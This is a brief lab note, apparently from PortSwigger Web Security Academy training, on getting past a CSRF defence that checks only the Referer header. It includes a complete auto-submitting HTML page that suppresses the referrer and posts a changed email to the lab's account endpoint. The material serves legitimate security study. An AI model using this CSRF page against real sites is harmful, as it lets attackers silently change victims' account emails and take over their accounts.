This lab uses the referer parameter, only that. So, the way to sort this out is add a meta tag and declare that you will not use the "referrer" tag
![[Pasted image 20250204220505.png]]
`<html>`
    `<head>`
        `<meta name="referrer" content="never">` 
    `</head>`
    `<body>`
        `<h1>Hello world!</h1>`
        `<form action="https://0a3500f3048aee87dac97c23006c00db.web-security-academy.net/my-account/change-email" method = "post" id="csrf-form">`
            `<input type="hidden" name="email" value="test@test.ca">`
        `</form>`

        `<script>document.getElementById("csrf-form").submit()</script>`
    `</body>`
`</html>`